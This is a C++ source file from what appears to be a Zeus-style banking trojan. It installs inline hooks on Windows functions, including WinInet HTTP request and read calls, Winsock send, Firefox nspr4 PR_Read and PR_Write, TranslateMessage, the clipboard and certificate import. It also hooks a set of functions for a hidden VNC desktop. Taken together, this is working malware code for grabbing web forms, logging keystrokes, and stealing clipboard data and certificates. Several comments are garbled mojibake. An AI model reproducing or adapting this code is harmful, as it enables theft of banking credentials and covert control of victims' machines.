#include <windows.h>
#include <wincrypt.h>
#include <wininet.h>
#include <ws2tcpip.h>

#include "defines.h"
#include "core.h"
#include "winapitables.h"
#include "corehook.h"
#include "sockethook.h"
#include "userhook.h"
#include "certstorehook.h"
#include "vnc\vncserver.h"
#include "wininethook.h"
#include "nspr4hook.h"

#include "..\common\wahook.h"
#include "..\common\peimage.h"
#include "..\common\process.h"
#include "..\common\debug.h"

typedef struct
{
  void *functionForHook;
  void *hookerFunction;
  void *originalFunction;
  BYTE originalFunctionSize;
}HOOKWINAPI;

void WinApiTables::init(void)
{

}

void WinApiTables::uninit(void)
{

}

/*
  ����� ������� ��� ����������� � �������� ��������.

  OUT hwa - ��������� ������.
*/
static void setCreateProcessNotifyApi(HOOKWINAPI *hwa)
{
  if(coreData.ntdllApi.ntCreateUserProcess != NULL)
  {
    hwa->functionForHook = coreData.ntdllApi.ntCreateUserProcess;
    hwa->hookerFunction  = CoreHook::hookerNtCreateUserProcess;
  }
  else /*if(coreData.ntdllApi.ntCreateThread != NULL) //Both functions can not be NULL, see the Core:: init () * /
  {
    hwa->functionForHook = coreData.ntdllApi.ntCreateThread;
    hwa->hookerFunction  = CoreHook::hookerNtCreateThread;
  }
}

/*
  ������� ������������ �� ���x WinApi �� ������

  IN process            - �������.
  IN OUT list           - ������.
  IN count              - ���. ����������.

  Return                - true - ���� ����� �������� �� ���� WinApi,
                          false - ���� �� ���� �������� ���� �� � ����� WinAPI.
*/
static bool unhookList(HANDLE process, HOOKWINAPI *list, DWORD count)
{
  bool ok = true; 
  for(DWORD i = 0; i < count; i++)if(list[i].originalFunction != NULL)
  {
    if(!WaHook::_unhook(process, list[i].functionForHook, list[i].originalFunction, list[i].originalFunctionSize))
    {
      ok = false;
#     if defined WDEBUG1
      WDEBUG1(WDDT_ERROR, "Failed to unhook WinApi at index %u", i);
#     endif
    }
    /*else
    {
      PeImage::_repalceImportFunction(coreData.modules.current, list[i].originalFunction, list[i].functionForHook);
      Core::replaceFunction(list[i].originalFunction, list[i].functionForHook);
    }*/
  }
  return ok;
}

static void hotPatchCallback(const void *functionForHook, const void *originalFunction)
{
  PeImage::_repalceImportFunction(coreData.modules.current, functionForHook, originalFunction);
  Core::replaceFunction(functionForHook, originalFunction);
}

/*  Intercepts all WinApi list

  IN process - a process.
  IN OUT list - a list.
  IN count - count. eelementov.
  IN realCount - col. eelementov, should be equal. The meaning of this concept in the code.

  Return - true - if all intercepted WinApi,
                          false - if not caught at least one of WinAPI.*/
static bool hookList(HANDLE process, HOOKWINAPI *list, DWORD count, DWORD realCount)
{
  //Insured.
  if(count != realCount)
  {
#   if defined WDEBUG2
    WDEBUG2(WDDT_ERROR, "count != realCount, %u != %u", count, realCount);
#   endif
    return false;
  }

  //Zero out the structure just in case.
  for(DWORD i = 0; i < count; i++)
  {
    if(list[i].functionForHook == NULL)
    {
#     if defined WDEBUG1
      WDEBUG1(WDDT_ERROR, "NULL WinApi founded at index %u", i);
#     endif
      return false;
    }
    list[i].originalFunction    = NULL;
    list[i].originalFunctionSize = 0;
  }
  
  LPBYTE opcodesBuf = (LPBYTE)WaHook::_allocBuffer(process, count);
  if(opcodesBuf != NULL)
  {
    //Put the hooks.
    DWORD i = 0;
    for(; i < count; i++)
    {
      DWORD curOpcodesSize = WaHook::_hook(process, list[i].functionForHook, list[i].hookerFunction, opcodesBuf, hotPatchCallback);
      if(curOpcodesSize == 0)
      {
#      if defined WDEBUG1
        WDEBUG1(WDDT_ERROR, "Failed to hook WinApi at index %u", i);
#       endif
        break;
      }
      
      list[i].originalFunction     = opcodesBuf;
      list[i].originalFunctionSize = curOpcodesSize;
      
      opcodesBuf += curOpcodesSize;
    }

    if(i == count)return true;
      
    //Remove hooks.
    unhookList(process, list, count);
  }
  
  return false;
}

//////////////////////////////////////////////////// ////////////////////////////////////////////////
// Table interception for a custom process.
//////////////////////////////////////////////////// ////////////////////////////////////////////////
static HOOKWINAPI userHooks[] =
{
  {NULL, NULL,                                          NULL, 0},
#if defined(HOOKER_LDRLOADDLL)
  {NULL, CoreHook::hookerLdrLoadDll,                    NULL, 0},
#endif                                      

#if(0)
  {NULL, CoreHook::hookerNtQueryDirectoryFile,          NULL, 0},
#endif

#if defined HOOKER_NTCREATEFILE
  {NULL, CoreHook::hookerNtCreateFile,                  NULL, 0},
#endif

  {NULL, CoreHook::hookerGetFileAttributesExW,          NULL, 0},

#if(BO_WININET > 0)
  {NULL, WininetHook::hookerHttpSendRequestW,           NULL, 0},
  {NULL, WininetHook::hookerHttpSendRequestA,           NULL, 0},
  {NULL, WininetHook::hookerHttpSendRequestExW,         NULL, 0},
  {NULL, WininetHook::hookerHttpSendRequestExA,         NULL, 0},
  {NULL, WininetHook::hookerInternetCloseHandle,        NULL, 0},
  {NULL, WininetHook::hookerInternetReadFile,           NULL, 0},
  {NULL, WininetHook::hookerInternetReadFileExA,        NULL, 0},
  {NULL, WininetHook::hookerInternetQueryDataAvailable, NULL, 0},
  {NULL, WininetHook::hookerHttpQueryInfoA,             NULL, 0},
#endif

#if(BO_SOCKET_FTP > 0 || BO_SOCKET_POP3 > 0)
  {NULL, SocketHook::hookerCloseSocket,                 NULL, 0},
  {NULL, SocketHook::hookerSend,                        NULL, 0},
  {NULL, SocketHook::hookerWsaSend,                     NULL, 0},
#endif

#if(BO_VNC > 0)
  {NULL, VncServer::hookerOpenInputDesktop,             NULL, 0},
  {NULL, VncServer::hookerSwitchDesktop,                NULL, 0},
  {NULL, VncServer::hookerDefWindowProcW,               NULL, 0},
  {NULL, VncServer::hookerDefWindowProcA,               NULL, 0},
  {NULL, VncServer::hookerDefDlgProcW,                  NULL, 0},
  {NULL, VncServer::hookerDefDlgProcA,                  NULL, 0},
  {NULL, VncServer::hookerDefFrameProcW,                NULL, 0},
  {NULL, VncServer::hookerDefFrameProcA,                NULL, 0},
  {NULL, VncServer::hookerDefMDIChildProcW,             NULL, 0},
  {NULL, VncServer::hookerDefMDIChildProcA,             NULL, 0},
  {NULL, VncServer::hookerCallWindowProcW,              NULL, 0},
  {NULL, VncServer::hookerCallWindowProcA,              NULL, 0},

  {NULL, VncServer::hookerRegisterClassW,               NULL, 0},
  {NULL, VncServer::hookerRegisterClassA,               NULL, 0},
  {NULL, VncServer::hookerRegisterClassExW,             NULL, 0},
  {NULL, VncServer::hookerRegisterClassExA,             NULL, 0},

  {NULL, VncServer::hookerBeginPaint,                   NULL, 0},
  {NULL, VncServer::hookerEndPaint,                     NULL, 0},
  {NULL, VncServer::hookerGetDcEx,                      NULL, 0},
  {NULL, VncServer::hookerGetDc,                        NULL, 0},
  {NULL, VncServer::hookerGetWindowDc,                  NULL, 0},
  {NULL, VncServer::hookerReleaseD�,                    NULL, 0},
  {NULL, VncServer::hookerGetUpdateRect,                NULL, 0},
  {NULL, VncServer::hookerGetUpdateRgn,                 NULL, 0},
  
  {NULL, VncServer::hookerGetMessagePos,                NULL, 0},
  {NULL, VncServer::hookerGetCursorPos,                 NULL, 0},
  {NULL, VncServer::hookerSetCursorPos,                 NULL, 0},
  {NULL, VncServer::hookerSetCapture,                   NULL, 0},
  {NULL, VncServer::hookerReleaseCapture,               NULL, 0},
  {NULL, VncServer::hookerGetCapture,                   NULL, 0},
  {NULL, VncServer::hookerGetMessageW,                  NULL, 0},
  {NULL, VncServer::hookerGetMessageA,                  NULL, 0},
  {NULL, VncServer::hookerPeekMessageW,                 NULL, 0},
  {NULL, VncServer::hookerPeekMessageA,                 NULL, 0},
#endif

  {NULL, UserHook::hookerTranslateMessage,              NULL, 0},
  {NULL, UserHook::hookerGetClipboardData,              NULL, 0},
# if defined HOOKER_SETWINDOWTEXT
  {NULL, UserHook::hookerSetWindowTextW,                NULL, 0},
# endif

  {NULL, CertStoreHook::_hookerPfxImportCertStore,      NULL, 0},
};

bool WinApiTables::_setUserHooks(void)
{
  DWORD i = 0;

  setCreateProcessNotifyApi(&userHooks[i++]);

#if defined HOOKER_LDRLOADDLL
  userHooks[i++].functionForHook = coreData.ntdllApi.ldrLoadDll;
#endif
#if(0)
  userHooks[i++].functionForHook = coreData.ntdllApi.ntQueryDirectoryFile;
#endif
#if defined HOOKER_NTCREATEFILE
  userHooks[i++].functionForHook = coreData.ntdllApi.ntCreateFile;  
#endif
  userHooks[i++].functionForHook = CWA(kernel32, GetFileAttributesExW);

#if(BO_WININET > 0)
  userHooks[i++].functionForHook = CWA(wininet, HttpSendRequestW);
  userHooks[i++].functionForHook = CWA(wininet, HttpSendRequestA);
  userHooks[i++].functionForHook = CWA(wininet, HttpSendRequestExW);
  userHooks[i++].functionForHook = CWA(wininet, HttpSendRequestExA);
  userHooks[i++].functionForHook = CWA(wininet, InternetCloseHandle);
  userHooks[i++].functionForHook = CWA(wininet, InternetReadFile);
  userHooks[i++].functionForHook = CWA(wininet, InternetReadFileExA);
  userHooks[i++].functionForHook = CWA(wininet, InternetQueryDataAvailable);
  userHooks[i++].functionForHook = CWA(wininet, HttpQueryInfoA);
#endif

#if(BO_SOCKET_FTP > 0 || BO_SOCKET_POP3 > 0)
  userHooks[i++].functionForHook = CWA(ws2_32, closesocket);
  userHooks[i++].functionForHook = CWA(ws2_32, send);
  userHooks[i++].functionForHook = CWA(ws2_32, WSASend);
#endif

#if(BO_VNC > 0)
  userHooks[i++].functionForHook = CWA(user32, OpenInputDesktop);
  userHooks[i++].functionForHook = CWA(user32, SwitchDesktop);
  userHooks[i++].functionForHook = CWA(user32, DefWindowProcW);
  userHooks[i++].functionForHook = CWA(user32, DefWindowProcA);
  userHooks[i++].functionForHook = CWA(user32, DefDlgProcW);
  userHooks[i++].functionForHook = CWA(user32, DefDlgProcA);
  userHooks[i++].functionForHook = CWA(user32, DefFrameProcW);
  userHooks[i++].functionForHook = CWA(user32, DefFrameProcA);
  userHooks[i++].functionForHook = CWA(user32, DefMDIChildProcW);
  userHooks[i++].functionForHook = CWA(user32, DefMDIChildProcA);
  userHooks[i++].functionForHook = CWA(user32, CallWindowProcW);
  userHooks[i++].functionForHook = CWA(user32, CallWindowProcA);
  
  userHooks[i++].functionForHook = CWA(user32, RegisterClassW);
  userHooks[i++].functionForHook = CWA(user32, RegisterClassA);
  userHooks[i++].functionForHook = CWA(user32, RegisterClassExW);
  userHooks[i++].functionForHook = CWA(user32, RegisterClassExA);

  userHooks[i++].functionForHook = CWA(user32, BeginPaint);
  userHooks[i++].functionForHook = CWA(user32, EndPaint);
  userHooks[i++].functionForHook = CWA(user32, GetDCEx);
  userHooks[i++].functionForHook = CWA(user32, GetDC);
  userHooks[i++].functionForHook = CWA(user32, GetWindowDC);
  userHooks[i++].functionForHook = CWA(user32, ReleaseDC);
  userHooks[i++].functionForHook = CWA(user32, GetUpdateRect);
  userHooks[i++].functionForHook = CWA(user32, GetUpdateRgn);
  
  userHooks[i++].functionForHook = CWA(user32, GetMessagePos);
  userHooks[i++].functionForHook = CWA(user32, GetCursorPos);
  userHooks[i++].functionForHook = CWA(user32, SetCursorPos);
  userHooks[i++].functionForHook = CWA(user32, SetCapture);
  userHooks[i++].functionForHook = CWA(user32, ReleaseCapture);
  userHooks[i++].functionForHook = CWA(user32, GetCapture);
  userHooks[i++].functionForHook = CWA(user32, GetMessageW);
  userHooks[i++].functionForHook = CWA(user32, GetMessageA);
  userHooks[i++].functionForHook = CWA(user32, PeekMessageW);
  userHooks[i++].functionForHook = CWA(user32, PeekMessageA);
#endif

  userHooks[i++].functionForHook = CWA(user32, TranslateMessage);
  userHooks[i++].functionForHook = CWA(user32, GetClipboardData);
# if defined HOOKER_SETWINDOWTEXT
  userHooks[i++].functionForHook = CWA(user32, SetWindowTextW);
# endif

  userHooks[i++].functionForHook = CWA(crypt32, PFXImportCertStore);

  //Hook.
  return hookList(CURRENT_PROCESS, userHooks, i, sizeof(userHooks) / sizeof(HOOKWINAPI));
}

bool WinApiTables::_removeUserHooks(void)
{
  return unhookList(CURRENT_PROCESS, userHooks, sizeof(userHooks) / sizeof(HOOKWINAPI));
}

//////////////////////////////////////////////////// ////////////////////////////////////////////////
// Table interception nspr4.dll.
//////////////////////////////////////////////////// ////////////////////////////////////////////////

#if(BO_NSPR4 > 0)
#define DLL_NSPR4 L"nspr4.dll"

static HOOKWINAPI nspr4Hooks[] =
{
  {NULL, Nspr4Hook::hookerPrOpenTcpSocket, NULL, 0},
  {NULL, Nspr4Hook::hookerPrClose,         NULL, 0},
  {NULL, Nspr4Hook::hookerPrRead,          NULL, 0},
  {NULL, Nspr4Hook::hookerPrWrite,         NULL, 0}
};

bool WinApiTables::_trySetNspr4Hooks(void)
{
  HMODULE module = CWA(kernel32, GetModuleHandleW)(DLL_NSPR4);
  return module != NULL ? _setNspr4Hooks(module) : false;
}

bool WinApiTables::_trySetNspr4HooksEx(LPWSTR moduleName, HMODULE moduleHandle)
{
  return CWA(kernel32, lstrcmpiW)(moduleName, DLL_NSPR4) == 0 ? _setNspr4Hooks(moduleHandle) : false;
}

bool WinApiTables::_setNspr4Hooks(HMODULE nspr4Handle)
{
  DWORD i = 0;

  nspr4Hooks[i++].functionForHook = CWA(kernel, GetProcAddress)(nspr4Handle, "PR_OpenTCPSocket");
  nspr4Hooks[i++].functionForHook = CWA(kernel, GetProcAddress)(nspr4Handle, "PR_Close");
  nspr4Hooks[i++].functionForHook = CWA(kernel, GetProcAddress)(nspr4Handle, "PR_Read");
  nspr4Hooks[i++].functionForHook = CWA(kernel, GetProcAddress)(nspr4Handle, "PR_Write");

  //Hook.
  bool ok = hookList(CURRENT_PROCESS, nspr4Hooks, i, sizeof(nspr4Hooks) / sizeof(HOOKWINAPI));
  if(ok)Nspr4Hook::updateAddresses(nspr4Handle, nspr4Hooks[0].originalFunction, nspr4Hooks[1].originalFunction, nspr4Hooks[2].originalFunction, nspr4Hooks[3].originalFunction);

  return ok;
}
#endif
